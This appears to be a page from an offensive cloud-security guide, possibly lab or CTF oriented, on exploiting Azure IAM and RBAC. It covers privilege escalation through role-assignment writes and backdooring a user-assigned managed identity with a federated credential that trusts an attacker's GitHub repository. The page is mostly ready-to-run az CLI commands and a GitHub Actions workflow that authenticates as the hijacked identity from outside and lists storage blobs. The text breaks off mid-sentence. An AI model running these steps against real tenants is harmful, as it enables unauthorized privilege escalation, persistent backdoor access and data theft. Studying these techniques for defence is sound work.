---
title: "IAM & RBAC Explotation"
order: 22
description: Explotation of IAM & RBAC
---

## Create new roles

> The permission **Microsoft.Authorization/roleAssignments/write** is needed. This permission allows to create role assignments over a specific scope, allowing an attacker to escalate privileges by assigning himself or another controlled principal a more privileged role.

If the compromised principal has this action over a scope, it can directly grant a privileged role such as Owner, Contributor, Key Vault Secrets Officer, or any other built-in/custom role available in that scope:

```bash
az role assignment create \
  --role "Storage Blob Data Owner" \
  --assignee "$CLIENT_ID" \
  --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACCOUNT"
```

## Federated Identity Credential Injection (UAMI Backdoor)

> The permission **Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write** on a User-Assigned Managed Identity (UAMI) is enough to backdoor it. By injecting a Federated Identity Credential (FIC) that trusts an OIDC issuer you control (e.g. your own GitHub repository), you can mint access tokens **as the UAMI** from external infrastructure — no client secret, no certificate, no interactive login.

**Pick a target UAMI and grab its identifiers**

Pick a UAMI with interesting RBAC assignments (Storage Blob Data Reader, Key Vault Secrets User, Contributor on an RG, etc.). List role assignments per UAMI to spot juicy ones:

```bash
az identity list -o table

az role assignment list \
  --assignee "$UAMI_CLIENT_ID" \
  --all -o table
```

Grab the values you'll need later to authenticate as it:

```bash
az identity show \
  --name "$UAMI_NAME" \
  --resource-group "$RG" \
  --query "{clientId:clientId, tenantId:tenantId}"
```

**Inject the malicious Federated Identity Credential**

Create a GitHub repo under your account (public or private — irrelevant, only the OIDC `sub` claim matters).

Configure the UAMI to trust OIDC tokens issued by your repo:

```bash
az identity federated-credential create \
  --identity-name "$UAMI_NAME" \
  --resource-group "$RG" \
  --name "pwned" \
  --issuer "https://token.actions.githubusercontent.com" \
  --subject "repo:$GH_USER/$GH_REPO:ref:refs/heads/main" \
  --audiences "api://AzureADTokenExchange"
```

> The `subject` must match **exactly** the `sub` claim GitHub puts in its OIDC token. Format: `repo:<user>/<repo>:ref:refs/heads/<branch>`. Other valid subjects: `repo:<user>/<repo>:environment:<env>`, `repo:<user>/<repo>:pull_request`.

### Configure GitHub Actions

In the repo settings (`Settings → Secrets and variables → Actions`) add three repository secrets:


- `AZURE_CLIENT_ID` -> UAMI's `clientId`
- `AZURE_TENANT_ID` -> UAMI's `tenantId`
- `AZURE_SUBSCRIPTION_ID` -> target subscription ID 

Drop a workflow at `.github/workflows/exploit.yml`:

```yaml
name: Azure FIC Exploit

on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  read-flag:
    runs-on: ubuntu-latest
    steps:
      - name: Login en Azure via Federated Identity
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: List blobs
        run: |
          az storage blob list \
            --account-name <storage_account> \
            --container-name <container-name> \
            --auth-mode login \
            -o table
```

> `permissions: id-token: write` is **mandatory**. Without it GitHub doesn't issue the OIDC token and `azure/login` fails with an auth error.

### Trigger and collect

`git push` to `main` and check the Actions run. The login step shows:

